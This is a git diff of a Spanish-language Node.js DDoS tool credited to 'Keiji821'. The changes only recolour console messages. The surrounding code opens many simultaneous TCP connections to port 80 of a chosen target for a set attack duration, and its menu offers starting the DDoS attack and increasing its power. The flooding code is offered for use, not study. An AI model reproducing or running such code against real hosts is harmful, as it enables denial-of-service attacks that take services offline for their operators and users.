@@ -74,10 +74,10 @@ const sockets = [];
 for (let i = 0; i < numConnections; i++) {
 const socket = new net.Socket();
 socket.connect(80, url, () => {
-console.log(`[31m Conectado a ${url}`);
+console.log(`[32m Conectado a ${url}`);
 });
 socket.on('data', (data) => {
-console.log(`Dato recibido de ${url}`);
+console.log(`[32m Dato recibido de ${url}`);
 });
 socket.on('error', (err) => {
 console.error(`Error: ${err}`);
@@ -86,7 +86,7 @@ sockets.push(socket);
 }
 
 setTimeout(() => {
-console.log('Ataque finalizado');
+console.log('[32m Ataque finalizado');
 sockets.forEach((socket) => socket.destroy());
 }, attackDuration * 1000);
 } catch (error) {
@@ -96,13 +96,13 @@ console.error(`Error: ${error}`);
 
 const updateCode = async () => {
 try {
-console.log(`[36m Actualizando código...`);
+console.log(`[32m Actualizando código...`);
 const exec = require('child_process').exec;
 exec('git pull origin main', (error, stdout, stderr) => {
 if (error) {
 console.error(`Error: ${error}`);
 } else {
-console.log(`[36m Código actualizado correctamente!`);
+console.log(`[32m Código actualizado correctamente!`);
 }
 });
 } catch (error) {
@@ -112,17 +112,17 @@ console.error(`Error: ${error}`);
 
 const showMenu = () => {
 console.clear(); 
-console.log('[31m         DDoS attack    ');
+console.log('[32m         DDoS attack    ');
 console.log('⭐️ Desarrollado por Keiji821');
-console.log('[36m ⸂⎺⎺⎺⎺⎺⎺⎺⎺⎺⎺⎺⎺⎺⎺⎺⎺⎺⎺⎺⎺⎺⎺⎺⎺⎺⎺⎺⎺⎺⎺⎺⎺⎺⎺⎺⎺⎺⎺⸃');
-console.log('[32m ︳1. Iniciar ataque DDoS                ︳');
-console.log('[34m ︳2. Actualizar código                  ︳');
-console.log('[36m ︳3. Configurar conexiones simultaneas  ︳');
-console.log('[33m ︳4. Aumentar potencia del ataque       ︳');
-console.log('[31m ︳5. Realizar análisis de seguridad     ︳');
-console.log('[31m ︳6. Salir                              ︳');
-console.log('[36m ⸌⎽⎽⎽⎽⎽⎽⎽⎽⎽⎽⎽⎽⎽⎽⎽⎽⎽⎽⎽⎽⎽⎽⎽⎽⎽⎽⎽⎽⎽⎽⎽⎽⎽⎽⎽⎽⎽⎽⸍');
-rl.setPrompt('[37m  🌐➤ '); 
+console.log('[32m ⸂⎺⎺⎺⎺⎺⎺⎺⎺⎺⎺⎺⎺⎺⎺⎺⎺⎺⎺⎺⎺⎺⎺⎺⎺⎺⎺⎺⎺⎺⎺⎺⎺⎺⎺⎺⎺⎺⎺⸃');
+console.log('[32m ︳1. Iniciar ataque DDoS                ︳');
+console.log('[32m ︳2. Actualizar código                  ︳');
+console.log('[32m ︳3. Configurar conexiones simultaneas  ︳');
+console.log('[32m ︳4. Aumentar potencia del ataque       ︳');
+console.log('[32m ︳5. Realizar análisis de seguridad     ︳');
+console.log('[32m ︳6. Salir                              ︳');
+console.log('[32m ⸌⎽⎽⎽⎽⎽⎽⎽⎽⎽⎽⎽⎽⎽⎽⎽⎽⎽⎽⎽⎽⎽⎽⎽⎽⎽⎽⎽⎽⎽⎽⎽⎽⎽⎽⎽⎽⎽⎽⸍');
+rl.setPrompt('[32m  🌐➤ '); 
 rl.prompt(); 
 };
 
